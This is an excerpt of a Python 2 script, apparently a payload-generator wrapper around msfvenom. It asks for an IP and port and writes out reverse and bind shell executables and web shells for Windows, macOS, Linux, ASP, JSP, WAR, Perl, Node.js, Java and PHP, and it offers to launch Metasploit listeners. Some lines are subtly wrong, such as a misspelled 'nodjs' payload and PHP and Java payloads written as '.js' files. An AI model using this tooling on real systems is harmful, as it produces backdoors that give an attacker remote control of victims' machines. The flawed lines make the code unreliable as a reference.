...
def meta_reverse_exe():
	...
	subprocess.Popen('msfvenom -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f exe > metareverse.exe'.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
...
def meta_reverse_dll():
	...
	subprocess.Popen('msfvenom -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f dll > metareverse.dll'.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
...
def meta_bind_exe():
	...
	subprocess.Popen('msfvenom -p windows/meterpreter/bind_tcp RHOST={0} LPORT={1} -f exe > metabind.exe '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
...
def meta_bind_dll():
	ip = raw_input("What is the Remote Host IP: ")
	port = raw_input ("What is the Remote Port IP: ")
	subprocess.Popen('msfvenom -p windows/meterpreter/bind_tcp RHOST={0} LPORT={1} -f dll > metabind.dll '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
...
def powershell_bind():
	...
	subprocess.Popen('msfvenom -p windows/x64/powershell_bind_tcp RHOST={0} LPORT={1} > powerbind.bat'.format (ip,port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
...
def powershell_reverse():
	...
	port = raw_input ("What is the LOCAL Port: ")
	subprocess.Popen('msfvenom -p windows/x64/powershell_reverse_tcp LHOST={0} LPORT={1} > powerreverse.bat '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
...
def  powershell_cmd_bind():
	ip = raw_input("What is the Remote Host IP: ")
	port = raw_input ("What is the Remote Port: ")
	subprocess.Popen('msfvenom -p cmd/windows/powershell_bind_tcp RHOST={0} LPORT={1} > powerbind-cmd.bat '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
...
def powershell_cmd_reverse():
		ip = raw_input("What is the LOCAL Host IP: ")
		port = raw_input ("What is the LOCAL Port: ")
		subprocess.Popen('msfvenom -p cmd/windows/powershell_reverse_tcp LHOST={0} LPORT={1} > powerreverse-cmd.bat '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
...
def osx_reverse_x64_meta():
	ip = raw_input("What is the LOCAL Host IP: ")
	port = raw_input ("What is the LOCAL Port: ")
	subprocess.Popen('msfvenom -p osx/x64/meterpreter/reverse_tcp  LHOST={0} LPORT={1} -f macho > osx-reverse_meta.macho '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
...
def osx_bind_x64_meta():
	ip = raw_input("What is the Remote Host IP: ")
	port = raw_input ("What is the Remote Port: ")
	subprocess.Popen('msfvenom -p osx/x64/meterpreter/bind_tcp  RHOST={0} LPORT={1} -f macho > osx-bind_meta.macho '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
...
def osx_reverse_nometa():
	ip = raw_input("What is the LOCAL Host IP: ")
	port = raw_input ("What is the LOCAL Port: ")
	subprocess.Popen('msfvenom -p osx/x86/shell_reverse_tcp  LHOST={0} LPORT={1} -f macho > osx-reverse.macho '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload osx-reverse.macho Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
...
def osx_reverse_meter_https():
	ip = raw_input("What is the LOCAL Host IP: ")
	port = raw_input ("What is the LOCAL Port: ")
	subprocess.Popen('msfvenom -p osx/x64/meterpreter_reverse_https  LHOST={0} LPORT={1} -f macho > osx-reverse_https.macho '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
...
def linux_meter_bind():
	ip = raw_input("What is the Remote Host IP: ")
	port = raw_input ("What is the Remote Port: ")
	subprocess.Popen('msfvenom -p  linux/x86/meterpreter/bind_tcp LHOST={0} LPORT={1} -f elf > linux_meta_reverse.elf '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload linux_meta_reverse.elf Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
...
def linux_reverse():
	ip = raw_input("What is the Local Host IP: ")
	port = raw_input ("What is the Local Port: ")
	subprocess.Popen('msfvenom -p   linux/x86/shell/reverse_tcp LHOST={0} LPORT={1} -f elf > linux_meta_reverse.elf '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload linux_meta_reverse.elf Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
...
def linux_bind():
	ip = raw_input("What is the Remote Host IP: ")
	port = raw_input ("What is the Remote Port: ")
	subprocess.Popen('msfvenom -p   linux/x86/shell/bind_tcp LHOST={0} LPORT={1} -f elf > linux_meta_reverse.elf '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload linux_meta_reverse.elf Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
...
def linux_x64_reverse():
	ip = raw_input("What is the Local Host IP: ")
	port = raw_input ("What is the Local Port: ")
	subprocess.Popen('msfvenom -p   linux/x64/shell/reverse_tcp LHOST={0} LPORT={1} -f elf > linux_meta_reverse.elf '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload linux_meta_reverse.elf Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
...
def linux_x64_bind():
	ip = raw_input("What is the Remote Host IP: ")
	port = raw_input ("What is the Remote Port: ")
	subprocess.Popen('msfvenom -p   linux/x64/shell/bind_tcp LHOST={0} LPORT={1} -f elf > linux_meta_reverse.elf '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload linux_meta_reverse.elf Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
...
def asp_payload():
	ip = raw_input("What is the Local Host IP: ")
	port = raw_input ("What is the Local Port: ")
	subprocess.Popen('msfvenom -p   windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f asp > reverse.asp '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
...
def jsp_payload():
	ip = raw_input("What is the Local Host IP: ")
	port = raw_input ("What is the Local Port: ")
	subprocess.Popen('msfvenom -p   java/jsp_shell_reverse_tcp LHOST={0} LPORT={1} -f raw  > reverse.jsp '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
...
def war_payload():
	ip = raw_input("What is the Local Host IP: ")
	port = raw_input ("What is the Local Port: ")
	subprocess.Popen('msfvenom -p   java/jsp_shell_reverse_tcp LHOST={0} LPORT={1} -f war  > reverse.war '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload reverse.jsp Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
...
def perl_payload():
	ip = raw_input("What is the Local Host IP: ")
	port = raw_input ("What is the Local Port: ")
	subprocess.Popen('msfvenom -p   cmd/unix/reverse_perl LHOST={0} LPORT={1} -f raw  > reverse.pl '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
...
def nodjs_payload():
	ip = raw_input("What is the Local Host IP: ")
	port = raw_input ("What is the Local Port: ")
	subprocess.Popen('msfvenom -p nodjs/shell_reverse_tcp LHOST={0} LPORT={1} -f js  > reverse.js '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
...
def java_payload():
	ip = raw_input("What is the Local Host IP: ")
	port = raw_input ("What is the Local Port: ")
	subprocess.Popen('msfvenom -p java/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f js  > reverse.js '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload reverse.js Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
...
def php_payload():
	ip = raw_input("What is the Local Host IP: ")
	port = raw_input ("What is the Local Port: ")
	subprocess.Popen('msfvenom -p php/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f js  > reverse.js '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload reverse.js Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
